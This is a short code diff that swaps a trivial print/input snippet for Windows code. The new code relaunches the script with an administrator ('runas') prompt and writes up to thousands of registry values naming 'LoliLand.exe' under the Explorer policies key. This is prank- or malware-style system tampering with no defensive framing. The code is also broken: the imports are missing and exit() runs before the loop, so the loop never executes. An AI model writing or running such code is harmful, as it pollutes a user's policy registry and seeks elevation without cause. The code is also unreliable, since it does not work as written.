@@ -1,3 +1,11 @@
-print("12")
-s = input("::>>")
-print(s)
+ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable,
+                                        __file__, None, 1)
+exit()
+
+inp = random.randint(1, 10000)
+
+for i in range(inp):
+    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, winreg.KEY_ALL_ACCESS) as key:
+        test_ket = winreg.CreateKey(key, "TEST")
+        winreg.SetValueEx(test_ket, f"{i}", 0, winreg.REG_SZ, "LoliLand.exe")
+    
